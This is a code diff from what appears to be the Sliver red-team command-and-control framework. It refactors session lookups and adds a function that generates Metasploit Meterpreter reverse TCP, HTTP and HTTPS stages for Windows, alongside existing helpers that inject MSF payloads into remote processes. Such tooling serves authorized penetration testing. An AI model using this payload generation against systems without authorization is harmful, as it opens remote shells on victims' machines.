@@ -20,6 +20,7 @@ package rpc
 
 import (
 	"context"
+	"fmt"
 	"time"
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
@@ -33,7 +34,7 @@ import (
 
 // Msf - Helper function to execute MSF payloads on the remote system
 func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*commonpb.Empty, error) {
-	session := core.Hive.Sliver(req.Request.SessionID)
+	session := core.Sessions.Get(req.Request.SessionID)
 	if session == nil {
 		return nil, ErrInvalidSessionID
 	}
@@ -68,7 +69,7 @@ func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*commonpb.Emp
 
 // MsfRemote - Inject an MSF payload into a remote process
 func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*commonpb.Empty, error) {
-	session := core.Hive.Sliver(req.Request.SessionID)
+	session := core.Sessions.Get(req.Request.SessionID)
 	if session == nil {
 		return nil, ErrInvalidSessionID
 	}
@@ -99,4 +100,52 @@ func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*
 		return nil, err
 	}
 	return &commonpb.Empty{}, nil
+}
+
+// MsfStage - Generate a MSF compatible stage
+func (rpc *Server) MsfStage(config *clientpb.EggConfig) ([]byte, error) {
+	var (
+		stage   []byte
+		payload string
+		arch    string
+		uri     string
+	)
+
+	switch config.Arch {
+	case "amd64":
+		arch = "x64"
+	default:
+		arch = "x86"
+	}
+
+	// TODO: change the hardcoded URI to something dynamically generated
+	switch config.Protocol {
+	case clientpb.EggConfig_TCP:
+		payload = "meterpreter/reverse_tcp"
+	case clientpb.EggConfig_HTTP:
+		payload = "meterpreter/reverse_http"
+		uri = "/login.do"
+	case clientpb.EggConfig_HTTPS:
+		payload = "meterpreter/reverse_https"
+		uri = "/login.do"
+	default:
+		return stage, fmt.Errorf("Protocol not supported")
+	}
+
+	venomConfig := msf.VenomConfig{
+		Os:       "windows", // We only support windows at the moment
+		Payload:  payload,
+		LHost:    config.Host,
+		LPort:    uint16(config.Port),
+		Arch:     arch,
+		Format:   config.Format,
+		BadChars: []string{"\\x0a", "\\x00"}, // TODO: make this configurable
+		Luri:     uri,
+	}
+	stage, err := msf.VenomPayload(venomConfig)
+	if err != nil {
+		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
+		return stage, err
+	}
+	return stage, nil
 }
